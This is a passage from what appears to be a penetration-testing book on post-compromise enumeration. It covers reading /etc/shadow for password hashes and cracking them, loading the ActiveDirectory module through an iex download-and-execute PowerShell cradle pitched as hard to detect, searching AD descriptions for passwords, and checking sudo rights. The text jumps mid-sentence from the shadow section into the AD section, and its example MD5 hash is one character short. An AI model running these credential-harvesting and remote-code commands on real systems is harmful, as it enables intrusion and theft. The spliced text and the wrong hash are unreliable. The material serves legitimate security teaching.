
## I Can’t See My Shadow

The **/etc/shadow** file is used to store password hashes and is only readable by the **root** user, contrary to the **/etc/passwd** file. This is used to help control access to the hashes to protect the confidentiality and integrity of the system. There are many ways to access this file, most notably through sudo permissions to execute commands as a root user.

Passwords are stored as hashes within the computer. A hash is a one-way and deterministic mathematical algorithm that is used to prove access to a piece of sensitive information. For example, the string “**whyhello**” will always result in **f908a3b772d51e6473902f3e8937979** when passed to the MD5 hashing algorithm. Hashing is not encryption, as encryption is designed to be reversible. Hashing is intended to be only one way, which is why it is used to store passwords.

The shadow file is similar to the passwd file and has a familiar format. It is colon-delimited and contains various pieces of information that control access to the password hash. We see the username, the password hash, the last password change, and when the password will expire.

```text
kali:$y$j9T$zXfNEjP6ZPDCzabfgSLmj/$d.7S35JLORNCfMOvWCr7EjSrbA8atOfRB1N5Pbf51EA:19034:0:99999:7:::
```

To read this file, assuming that we have access to read it, we can use the **cat /etc/shadow** command to print it to the screen. Again, do not get overwhelmed with the amount of information printed on the screen! Instead, take it line by line, and keep in mind that many of these service accounts do not have any password assigned. Entries in **/etc/shadow** that do not have a password hash will have a **!** or **\*** in the entry instead, so that they cannot log into the system with a password.

```text
# cat /etc/shadow
root:!:19034:0:99999:7:::
daemon:*:19034:0:99999:7:::
bin:*:19034:0:99999:7:::
sys:*:19034:0:99999:7:::
sync:*:19034:0:99999:7:::
games:*:19034:0:99999:7:::
*** REDUCED FOR BREVITY ***
lightdm:*:19034:0:99999:7:::
colord:*:19034:0:99999:7:::
geoclue:*:19034:0:99999:7:::
king-phisher:*:19034:0:99999:7:::
kali:$y$j9T$zXfNEjP6ZPDCzabfgSLmj/$d.7S35JLORNCfMOvWCr7EjSrbA8atOfRB1N5Pbf51EA:19034:0:99999:7:::
redis:!:19238::::::
_gvm:!:19238::::::
mosquitto:!:19304::::::
polkitd:!*:19304::::::
chris:$6$j8eqkQAs9cmYjF8J$wgptfmGdyjZw0vBS/YuiYS9qrJdxfJg5iDO.goFw8fYT.20Re0g4ABU3WV3Gz3ekNfT2o5/2CbiYfPItoNebl.:19717:0:99999:7:::
```

Again, pay attention to the only two accounts which have password hashes stored—based on our analysis from the **/etc/passwd** file we know these are both interactive user accounts. After gaining access to the password hashes, we can load them into a password-cracking program like **hashcat** to try and crack the password.

The trick to gaining access to this file is that it requires root permissions to read it. However, there are various other misconfigurations, sudo misuse, and even system backups where we can access this file. The important thing to keep in mind is that this file is exceptionally useful to keep track of and gain access to if available.

Microsoft as well, such as Active Directory Users and Computers. We can bind directly to the LDAP service on the Domain Controller as well, so there are lots of options we can take to gather more information.

BloodHound is an excellent tool built by Specter Ops to enumerate and identify escalation paths within AD. A section further in this chapter will cover using BloodHound and finding common escalation paths.

To use the PowerShell ActiveDirectory module, the computer will need to have the module installed as a part of the Remote Server Administration Tools (RSAT) package. Microsoft has documentation on adding this feature to a machine,⁴ but it requires administrative level access to add new software. Since we’re operating from a foothold, we don’t have the juice to install new software on the machine.

![](img/181571ad74cba0e6a2f38fcd2658651e_206_0.png)

**FIGURE 7.3** Adding a new feature within the Windows 10 Settings panel for the RSAT Active Directory tools. This requires administrative permissions to install.

How can we get past this? Well, it turns out that the ActiveDirectory module is simply that, a PowerShell module at the end of the day. What we can do instead is transfer the Microsoft DLL to our machine and import them without a requirement for administrative access.

Several GitHub repositories host the signed ActiveDirectory module which can be imported directly into memory without touching the disk. One such repository is hosted at https://github.com/samratashok/ADModule, where the author has created an import script to install directly into memory⁵. The benefits of this approach are that the module is still the same one signed and trusted by Microsoft, which indicates a VERY low chance of detection by malware tools. This can be launched and imported with the following PowerShell command:

```powershell
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

What this command does is download the file as a string, then leverages it within the Invoke-Expression (aliased as iex) to run the commands within the string. Note that we can always download this PS1 file and host it on a local share for systems that do not have direct Internet access. Now that we have the module imported, we can begin to query AD directly from our user-level access.

If downloading the module this way does not work, we always can import the assembly from the Microsoft DLL into memory. The code below is an effective way to load the C# assembly from the DLL into memory, and then import the assembly into PowerShell. If you need a copy of the DLL, see the AD-Module repository on GitHub at https://github.com/m4lwhere/AD-Module.

```powershell
iwr -uri "https://github.com/m4lwhere/AD-Module/raw/main/Microsoft.ActiveDirectory.Management.dll" -outfile ~\AD.dll

$ad = [System.Reflection.Assembly]::Load(([byte[]]([IO.File]::ReadAllBytes ("C:\Users\Chris\AD.dll"))));

Import-Module -Assembly $ad
```

![](img/181571ad74cba0e6a2f38fcd2658651e_207_0.png)

**FIGURE 7.4** Showing that the ActiveDirectory module is not installed by attempting to use the Get-ADUser cmdlet, installing the ActiveDirectory signed module in memory through PowerShell Invoke-Expression (aliased as iex), and then showing access to Get-ADUser.

Now that we have imported this module, we can start enumerating users directly from the connected AD domain. Again, we are very interested in user descriptions since it is common for sysadmins to place passwords in the description box. Let’s try to identify all accounts on the domain that have a description — the command below searches based on a filter where the Description is not null.

```powershell
Get-ADUser -Filter {Description -like "*"} -Properties * | Select-Object samAccountName, Enabled, Description
```

Now this gives us a nice table and check it out! Looks like there are at least two accounts with a password in the description. Note that one is labeled as disabled, but there is a very high likelihood that the same password is assigned to other accounts in the domain.

![](img/181571ad74cba0e6a2f38fcd2658651e_207_1.png)

**FIGURE 7.5** Using the Get-ADUser cmdlet to gather account names and descriptions.

In operational environments, it is common to find several thousands of user accounts we need to parse and understand. We can always refine this search further by filtering based on specific strings to search within the Description field, such as “Password”, “Pass”, and “pwd”. The PowerShell cmdlet **Select-String** operates in a way similar to the Linux **grep** utility and allows us to search via regex. We can leverage the regex to try and quickly locate sensitive findings with something similar to “p.ss” which would match on “Password”, “p@ssword”, and “p@Ssw0rd”. Select-String is case-insensitive by default, meaning that it will match on uppercase or lowercase letters.

```powershell
Get-ADUser -Filter {Description -like "*"} -Properties * | Select-Object samAccountName, Enabled, Description | Select-String -Pattern p.ss, pw, pwd
```

![](img/181571ad74cba0e6a2f38fcd2658651e_208_0.png)

**FIGURE 7.6** Adding the Select-String cmdlet to use regex to try and locate account descriptions with passwords.

## Who’s Got the Juice?

Now that we know who else is on this system, we need to identify who has the juice to gain administrative or root level access. Generally, this is through various group memberships on a Windows machine and through sudo permissions for a Linux machine.

Local administrator privileges give us a big advantage as we work through an environment—this means that we can gain sensitive information stored on the computer and attempt to use that to pivot further within the environment. Certain items such as additional password hashes, local browsing data, and personal notes tend to be areas where users store additional authentication information. Our job is to try and find these weaknesses before a threat actor can—and that way we can remove and reduce the risk as much as possible.

## Sudo Make Me a Sandwich

The sudo permission on Linux machines allows certain users to run commands directly as the root user or as a different user on the local machine. This is necessary in most environments, especially for system administrators and other necessary system tasks. Utilizing sudo can be done effectively and securely if properly scoped and tested.

Several plugin policies can be enabled and utilized for the sudo program, the most common is the sudoers file. This file is located at **/etc/sudoers** and leverages the policy stored there to determine who and what is allowed to occur within the sudo command. The policy can be defined to determine if a password is required to use certain commands or not.

To list what actions the current account can take with sudo, run the command below (this uses a LOWERCASE “L” as a switch). This lists the allowed and forbidden commands for the user on the current host. This will further reveal which commands are allowed and in which format.

```text
$ sudo -l
Matching Defaults entries for chris on MSI:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:
    /bin\:/snap/bin

User chris may run the following commands on MSI:
    (ALL : ALL) NOPASSWD: ALL
```
